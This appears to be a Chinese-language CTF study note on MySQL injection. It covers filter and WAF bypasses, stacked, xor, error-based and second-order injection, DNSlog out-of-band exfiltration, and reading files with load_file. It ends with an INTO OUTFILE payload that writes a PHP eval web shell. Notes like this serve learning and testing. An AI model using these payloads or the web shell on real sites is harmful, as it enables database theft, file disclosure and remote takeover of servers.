[TOC]



# Mysql基础

## 名词解析

**information_schema库**:信息数据库,包括其他数据库的信息,包括数据库名,数据库表,表字段数据类型等

**SCHEMATA**表:提供当前mysql实例所有数据库信息,show databases结果就取自于此]

**tables表**:表

**columns表**:列

**mysql库**:mysql核心数据库,主要储存用户,权限设置,关键字等



## 注释

①-- this is zhushi

如上面的格式,俩横杠一空格后面的是注释(一定注意加空格)

②#this is zhushi

单井号后面也是注释

***推荐用第一种,有的时候#会被屏蔽***



## 基础指令

use 数据库名;  -- 改库

show tables; -- 打印库里所有表











## 常用系统自带函数

now(); -- 当前时间

database(); -- 当前使用数据库

version(); -- 当前版本

user(); -- 当前用户





## 特殊指令

select @@datadir; -- 查看数据路径

select @@basedir; -- 查看数据库路径

select @@version_compile_os; -- 查看mysql安装的系统(linux,win)



# 总体分类组合

| 类型                     | 请求方式  | 位置             |
| ------------------------ | --------- | ---------------- |
| 显注，盲注（时间，布尔） | get，post | 参数，cookie，UA |

总共3*2\*3=18种sql注入方式



# DNSLOG配合sql注入攻击（只支持windows）

### 原理

假定我们的目的是要知道当前服务器sql数据库的用户名，ns服务器是可以记录dns记录的，而服务器收到恶意的sql语句后，例如user().test.com，被指定访问该资源，数据库接受到后，user()会被执行为root（只是例子）,进而访问root.test.com就会像本地dns访问，请求ip地址，但这些都在后端，我们是看不见的。但假如我们能查看ns服务器的日志，就会看到请求了root.test.com，这个root就是我们想要的结果

善于使用这个机制，可以在windows搭载数据库的环境中将盲注变为显注。

![img](https://www.programmerall.com/images/647/a8/a8db158b12058d2243a43334286be4df.png)

### 应用

在线的dnslog：http://ceye.io

### 防御方式

- 黑名单策略：把国内常见的dnslog网站地址全指向localhost
- 白名单策略：只允许访问特定的dns服务器

# 绕过字符检测

有的时候会进行url的字符检测,比如屏蔽掉or,by,not这种

## 大小写绕过

因为sql语句大小写不敏感,所以可能类似于屏蔽了SELECT和select,但是没屏蔽sElEcT这种.当然如果是waf基本没这个漏洞

## 双写绕过

or→oorr

by→bbyy

union→ununionion

select→seselectlect

where→whwhereere

from→frorom

**原理**:有的网站对sql语句只进行一次检测,并过滤敏感词,这样se**select**lect中间的select被过滤掉后,左右两边的重新拼接成select,实现绕过

但是当网站循环匹配时就失效了



## url编码绕过

通常来说，在浏览器输入URL时，浏览器会对一些字符进行URL  编码如，百分号%变为%25,空格变为%20、单引号%27、左括号%28、右括号%29。而服务器收到后会对其进行解码。如果网站具备防御机制，则会对解码后的内容进行规则匹配。然而一些程序在执行了过滤之后还会执行一次不必要的解码，

比如我们输入带有url编码的字符串：

`1%2527%20and%201%253d1%23`,这条字符在会被解码为：`1%27 and 1%3d1#`，其中没有`'`和`=`，假设这样就不会触发某些防御规则，然而当waf放过这串字符后，网站程序又会执行一次不必要的解码，再次解码后文本变成如此：`1' and 1=1#`，这一条将被数据库执行。



## 十六进制绕过



## char函数函数



## 等价语句替换

在有些函数或命令因其关键字被检测出来而无法使用的情况下，我们可以考虑使用与之等价或类似的代码替代其使用。

```
sleep() 与 benchmark()
concat_ws() 与 group_concat()
mid()=substr()=substring()
```

## 空格绕过:

1.用~,tap,%20,+,/**/代替

2.用()包裹

3.改用异或注入

例:/check.php?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))%23

## 注释绕过:

1.%23

2.--`



# 各种例外和技巧

## 输入数字有回显,输入字符无回显

参考buuctf-suctf 2019 easysql1

这道题能做到数字回显字符不回显,可以猜测有一个'或'结构,即||

可以尝试传*,1

例如select 输入||a from flag                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        

可以用*,1来使1||a返回1,来查询前面的\*



## 堆叠注入

在很多字符被屏蔽的情况下，尤其是select被屏蔽可以考虑

闭合原语句;sql注入语句 -- a

例如;show databases -- a

​        ;show tables -- a

​        ;show columns from 表名 -- a

## 在知道表名的情况下可以用handler绕过

;handler 表名 open as p;handler p read first – a



## 异或注入

例题:<font color='orange'>buuctf-hackworld</font>

相关说明:https://blog.csdn.net/SoporAeternus12/article/details/124001820

在sql语句里,在string和数字型比较时,前面数字开头的字符串,例如"123abc"就会被转为123

而前面不是数字开头的字符串,例如"abc123"就会被转换为<font color='red'>0</font>



异或注入说简单一点就是在构造where后面的判断条件时使用^（异或符号）来达到[sql注入攻击](https://so.csdn.net/so/search?q=sql注入攻击&spm=1001.2101.3001.7020)的目的，通常异步注入与一些自动化脚本比如bp中的intrude模块或者自己写一个python脚本来配合使用



## get型利用updatexml和extractvalue函数报错注入

原理:https://zhuanlan.zhihu.com/p/398726175

使用方法举例:updatexml(1,concat(0x7e,datebase()),1)

注:上面的0x7e对应的是~字符,所以看回显时若得到~ctfbase,则~后面的ctfbase就是我们要的内容

extractvalue同理



## floor函数报错注入

待学习



## 二次注入

例如重置密码场景，如sql语句：update passwd=$pass where username=uname

假如我先注册一个用户名，叫admin#

那么我再去修改密码就变成了update passwd=$pass where username=admin#

这样就变成了给admin账户修改密码了



## 宽字节注入

只适用于gbk编码的数据库情况

判断方法:有吃字符现象

待学习



# 利用sql注入读取和写入文件

## load_file()函数读文件

**buuctf:fakebook**有一种方法就是这样

MySQL的load_file()函数可以进行文件读取，**但是load_file()函数读取文件首先需要数据库配置FILE权限**（数据库**root用户**一般都有），**其次需要执行load_file()函数的MySQL用户/用户组对于目标文件具有可读权限（很多配置文件都是所有组/用户可读）**，主流Linux系统还需要Apparmor配置目录白名单（默认白名单限制在MySQL相关的目录下），可谓“一波三折”。即使这么严格的利用条件，我们还是经常可以在CTF线上比赛中遇到相关的文件读取题。



所以关键在于有足够的权限**(可以先用user()函数查看当前使用数据库的用户的身份是不是root)**

如果是,可以直接尝试load_file(文件路径)



例:union select 1,load_file("/var/www/html/flag.php"),3,4#



## 利用into outfile写文件

将sql语句查询结果写入指定路径的文件，需要数据库在指定路径有写入权限，且得知道目录，否则只能试

例：1' and 1=2 union select user,password from users into outfile '/var/www/dvwaplus/1.bak'#

### 配合一句话木马

```
1' and 1=2 union select 1,'<?php @eval($_POST[123])?>' into outfile '/var/www/dvwaplus/tq.php'#
```





​                          
